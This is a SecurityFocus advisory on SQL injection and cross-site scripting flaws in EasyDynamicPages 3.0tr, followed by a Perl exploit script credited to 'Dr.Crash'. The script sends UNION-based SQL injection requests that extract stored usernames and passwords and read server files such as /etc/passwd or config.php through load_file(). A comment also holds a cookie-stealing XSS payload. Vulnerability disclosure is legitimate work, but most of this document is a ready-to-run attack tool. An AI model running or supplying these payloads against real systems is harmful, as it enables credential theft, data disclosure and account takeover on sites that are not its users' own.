source: http://www.securityfocus.com/bid/30305/info

EasyDynamicPages is prone to multiple input-validation vulnerabilities, including an SQL-injection issue and a cross-site scripting issue, because it fails to sufficiently sanitize user-supplied data.

Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.

EasyDynamicPages 3.0tr is vulnerable; other versions may also be affected.


#!/usr/bin/perl
#----------------------------------------------------------------
#
#Script : Easydynamicpages 30tr
#
#Type : Multipe Vulerabilities ( Xss / Sql Injection Exploit / File 
Disclosure Exploit )
#
#Variable Method : GET
#
#Alert : High
#
#----------------------------------------------------------------
#
#Discovered by : Khashayar Fereidani a.k.a. Dr.Crash
#
#My Offical Website : HTTP://FEREIDANI.IR
#
#Khashayar Fereidani Email : irancrash [ a t ] gmail [ d o t] com
#
#----------------------------------------------------------------
#
#Khashayar Fereidani Offical Website : HTTP://FEREIDANI.IR
#
#----------------------------------------------------------------
#
#Script Download : 
http://myiosoft.com/download/EasyDynamicPages/easydynamicpages-30tr.zip
#
#----------------------------------------------------------------
#
#Xss 1 : 
http://Example/staticpages/easycalendar/index.php?PageSection=1&month=4&year=<script>alert(document.cookie);</script>
#
#----------------------------------------------------------------
#
#SQL Injection :
#
#SQL 1 : 
http://Example/dynamicpages/index.php?page=individual&table=edp_Help_Internal_News&read=1+union/**/select/**/0,1,2,3,concat(0x4c6f67696e3a,puUsername,0x3c656e64757365723e,0x0d0a50617373776f72643a,puPassword,0x3c656e64706173733e),5,6/**/from/**/edp_puusers/*
#
#
#----------------------------------------------------------------
#
#                        Tnx : God
#
#                     HTTP://IRCRASH.COM
#
#----------------------------------------------------------------


use LWP;
use HTTP::Request;
use Getopt::Long;




sub header
{
print "
****************************************************
*         Easydynamicpages 30tr Exploit            *
****************************************************
*Discovered by : Khashayar Fereidani               *
*Exploited by : Khashayar Fereidani                *
*My Official Website : http://fereidani.ir         *
****************************************************";
}

sub usage
{
  print "
* Usage : perl $0 http://Example/
****************************************************
";
}


$url = ($ARGV[0]);

if(!$url)
{
header();
usage();
exit;
}
if($url !~ /\//){$url = $url."/";}
if($url !~ /http:\/\//){$url = "http://".$url;}
sub xpl1()
{
$vul = 
"/dynamicpages/index.php?page=individual&table=edp_Help_Internal_News&read=1+union/**/select/**/0,1,2,3,concat(0x4c6f67696e3a,puUsername,0x3c656e64757365723e,0x0d0a50617373776f72643a,puPassword,0x3c656e64706173733e),5,6/**/from/**/edp_puusers/*";
$requestpage = $url.$vul;


my $req  = HTTP::Request->new("POST",$requestpage);
$ua = LWP::UserAgent->new;
$ua->agent( 'Mozilla/5.0 Gecko/20061206 Firefox/1.5.0.9' );
#$req->referer($url);
$req->referer("IRCRASH.COM");
$req->content_type('application/x-www-form-urlencoded');
$req->header("content-length" => $contlen);
$req->content($poststring);

$response = $ua->request($req);
$content = $response->content;
$header = $response->headers_as_string();

@name = split(/Login:/,$content);
$name = @name[1];
@name = split(/<enduser>/,$name);
$name = @name[0];

@password = split(/Password:/,$content);
$password = @password[1];
@password = split(/<endpass>/,$password);
$password = @password[0];

if(!$name && !$password)
{
print "\n\n";
print "!Exploit failed ! :(\n\n";
exit;
}

print "\n Username: ".$name."\n\n";
print " Password: " .$password."\n\n";


}


#XPL2

sub xpl2()
{
print "\n Example For File Address : /home/user/public_html/config.php\n 
Or /etc/passwd";
print "\n Enter File Address :";
$fil3 = <stdin>;

$vul = 
"/dynamicpages/index.php?page=individual&table=edp_Help_Internal_News&read=1+union/**/select/**/0,1,2,3,concat(0x4c6f67696e3a,load_file('$fil3'),0x3c656e64757365723e),5,6/**/from/**/edp_puusers/*";
$requestpage = $url.$vul;

my $req  = HTTP::Request->new("POST",$requestpage);
$ua = LWP::UserAgent->new;
$ua->agent( 'Mozilla/5.0 Gecko/20061206 Firefox/1.5.0.9' );
#$req->referer($url);
$req->referer("IRCRASH.COM");
$req->content_type('application/x-www-form-urlencoded');
$req->header("content-length" => $contlen);
$req->content($poststring);

$response = $ua->request($req);
$content = $response->content;
$header = $response->headers_as_string();


@name = split(/Login:/,$content);
$name = @name[1];
@name = split(/<enduser>/,$name);
$name = @name[0];


if(!$name && !$password)
{
print "\n\n";
print "!Exploit failed ! :(\n\n";
exit;
}

open (FILE, ">".source.".txt");
print FILE $name;
close (FILE);
print " File Save In source.txt\n";
print "";

}

#XPL2 END
#Starting;
print "
****************************************************
*         Easydynamicpages 30tr Exploit            *
****************************************************
*Discovered by : Khashayar Fereidani               *
*Exploited by : Khashayar Fereidani                *
*My Official Website : http://fereidani.ir         *
****************************************************
* Mod Options :                                    *
* Mod 1 : Find mysql username and root password    *
* Mod 2 : Save PHP config source in your system    *
****************************************************";
print "\n \n Enter Mod : ";
$mod=<stdin>;
if ($mod=="1" or $mod=="2") { print "\n Exploiting .............. \n"; } 
else { print "\n Unknown Mod ! \n Exploit Failed !"; };
if ($mod=="1") { xpl1(); };
if ($mod=="2") { xpl2(); };